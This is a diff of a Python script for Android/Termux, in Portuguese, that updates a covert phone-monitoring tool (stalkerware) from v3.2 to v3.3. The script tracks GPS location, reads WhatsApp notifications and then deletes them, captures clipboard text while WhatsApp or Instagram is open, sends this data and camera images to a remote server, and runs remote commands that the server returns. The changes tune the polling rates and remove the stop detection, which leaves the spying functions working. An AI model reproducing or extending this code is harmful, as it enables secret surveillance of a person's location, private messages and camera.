@@ -28,7 +28,6 @@ def obter_id():
     return novo
 
 def calcular_distancia(lat1, lon1, lat2, lon2):
-    """Distância em km entre dois pontos (Haversine)"""
     R = 6371
     dlat = radians(lat2 - lat1)
     dlon = radians(lon2 - lon1)
@@ -50,11 +49,11 @@ inicio = datetime.now()
 ultimo_ping = 0
 ultimo_whatsapp = 0
 ultimo_keylog = 0
+ultimo_dumpsys = 0
 historico_msg = {}
 msg_processadas = set()
-distancia_total = 0.0  # NOVO: distância acumulada
-ultimo_movimento = datetime.now()  # NOVO: para detectar paradas
-parado = False
+distancia_total = 0.0
+app_atual = "outro"
 
 def obter_rede():
     w = run("termux-wifi-connectioninfo")
@@ -67,7 +66,7 @@ def obter_rede():
     return "Dados Moveis"
 
 def obter_gps():
-    global ultima_lat, ultima_lon, gps_ok, distancia_total, ultimo_movimento, parado
+    global ultima_lat, ultima_lon, gps_ok, distancia_total
     out = run("termux-location -p gps -r once", timeout=6)
     if out:
         try:
@@ -77,19 +76,10 @@ def obter_gps():
             if lat and lon and float(lat) != 0 and float(lon) != 0:
                 lat_f = float(lat)
                 lon_f = float(lon)
-                
-                # Calcula distância percorrida
-                if ultima_lat != -16.6869:  # Não conta o primeiro ponto
+                if ultima_lat != -16.6869:
                     dist = calcular_distancia(ultima_lat, ultima_lon, lat_f, lon_f)
-                    if dist < 0.5:  # Só conta movimentos reais (< 500m)
+                    if dist < 0.5:
                         distancia_total += dist
-                        ultimo_movimento = datetime.now()
-                        parado = False
-                    else:
-                        parado = True  # Pulou muito longe (erro de GPS)
-                else:
-                    parado = True  # Primeiro ponto
-                
                 ultima_lat = lat_f
                 ultima_lon = lon_f
                 gps_ok = True
@@ -98,24 +88,25 @@ def obter_gps():
     gps_ok = False
 
 def obter_app_aberto():
-    foco = run("dumpsys window | grep mCurrentFocus", timeout=3)
+    global ultimo_dumpsys, app_atual
+    agora = time.time()
+    if agora - ultimo_dumpsys < 10:
+        return app_atual
+    foco = run("dumpsys window | grep mCurrentFocus", timeout=2)
+    ultimo_dumpsys = agora
     if foco:
         foco_lower = foco.lower()
-        if "whatsapp" in foco_lower: return "whatsapp"
-        elif "instagram" in foco_lower: return "instagram"
-    return "outro"
-
-def obter_texto_digitado():
-    clip = run("termux-clipboard-get", timeout=2)
-    if clip and len(clip) > 0: return clip[:200]
-    return None
+        if "whatsapp" in foco_lower: app_atual = "whatsapp"
+        elif "instagram" in foco_lower: app_atual = "instagram"
+        else: app_atual = "outro"
+    return app_atual
 
 def obter_whatsapp():
     global ultimo_whatsapp, historico_msg, msg_processadas
     agora = time.time()
-    if agora - ultimo_whatsapp < 8: return list(historico_msg.values())
+    if agora - ultimo_whatsapp < 10: return list(historico_msg.values())
     
-    notif = run("termux-notification-list", timeout=5)
+    notif = run("termux-notification-list", timeout=3)
     if notif:
         try:
             dados = json.loads(notif)
@@ -144,14 +135,13 @@ def obter_whatsapp():
                     
                     if pessoa not in historico_msg:
                         historico_msg[pessoa] = {"pessoa": pessoa, "mensagens": [], "ultima_msg": "", "total": 0, "midia": False}
-                    
                     historico_msg[pessoa]["mensagens"].append({"texto": texto[:150] if texto else "(sem texto)", "midia": tem_midia, "hora": datetime.now().strftime("%H:%M"), "tipo": "recebida"})
                     if len(historico_msg[pessoa]["mensagens"]) > 30: historico_msg[pessoa]["mensagens"] = historico_msg[pessoa]["mensagens"][-30:]
                     historico_msg[pessoa]["ultima_msg"] = texto[:80]
                     historico_msg[pessoa]["total"] = len(historico_msg[pessoa]["mensagens"])
                     historico_msg[pessoa]["midia"] = tem_midia
             
-            if novas: run("termux-notification-remove --all", timeout=3)
+            if novas: run("termux-notification-remove --all", timeout=2)
             ultimo_whatsapp = agora
         except: pass
     return list(historico_msg.values())
@@ -159,12 +149,12 @@ def obter_whatsapp():
 def obter_keylog():
     global ultimo_keylog
     agora = time.time()
-    if agora - ultimo_keylog < 3: return None
+    if agora - ultimo_keylog < 5: return None
     app = obter_app_aberto()
-    texto = obter_texto_digitado()
-    if app in ["whatsapp", "instagram"] or texto:
+    if app in ["whatsapp", "instagram"]:
+        texto = run("termux-clipboard-get", timeout=1)
         ultimo_keylog = agora
-        return {"app": app, "ativo": True, "texto": texto or "", "timestamp": datetime.now().strftime("%H:%M:%S")}
+        return {"app": app, "ativo": True, "texto": texto[:200] if texto else "", "timestamp": datetime.now().strftime("%H:%M:%S")}
     ultimo_keylog = agora
     return None
 
@@ -198,7 +188,7 @@ def enviar_lote(front_b64, back_b64):
         return r.status_code == 200
     except: return False
 
-print("🛰️  INICIADO v3.2 (Distância + Paradas)\n")
+print("🛰️  INICIADO v3.3 (Só distância, sem paradas)\n")
 
 while True:
     t0 = time.time()
@@ -218,18 +208,12 @@ while True:
     msgs_whats = obter_whatsapp()
     keylog = obter_keylog()
     
-    # Detecta se está parado há mais de 30 segundos
-    tempo_parado = (datetime.now() - ultimo_movimento).total_seconds()
-    ponto_parada = tempo_parado > 30 and not parado
-    
     payload = {
         "device_id": DEVICE_ID, "battery": bat,
         "uptime": str(datetime.now() - inicio).split('.')[0],
         "lat": ultima_lat, "lon": ultima_lon,
         "network": rede, "whatsapp": msgs_whats, "keylog": keylog,
-        "distancia_total": round(distancia_total, 2),  # NOVO
-        "ponto_parada": ponto_parada,  # NOVO
-        "tempo_parado": round(tempo_parado, 0)  # NOVO
+        "distancia_total": round(distancia_total, 2)
     }
     
     resp = enviar_dados(payload)
@@ -241,14 +225,10 @@ while True:
         cmd_remoto = resp.get("comando_remoto", "none")
         
         extra = f" | 🛣️ {distancia_total:.2f}km"
-        if keylog and keylog.get("ativo"): extra += f" | ⌨️ {keylog['app']}"
-        if msgs_whats: extra += f" | 💬 {len(msgs_whats)}"
-        if ponto_parada: extra += " | 🔴 PARADA"
+        if keylog and keylog.get("ativo"): extra += " | ⌨️"
+        if msgs_whats: extra += f" | 💬{len(msgs_whats)}"
         
         print(f"{icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede}{extra} | {dt:.1f}s")
-        
-        if keylog and keylog.get("texto"): print(f"   ⌨️ {keylog['texto'][:80]}")
-        if ponto_parada: print(f"   🔴 Parado há {int(tempo_parado)}s - Marcador no mapa!")
         
         if cmd_remoto != "none": executar_comando(cmd_remoto)
         
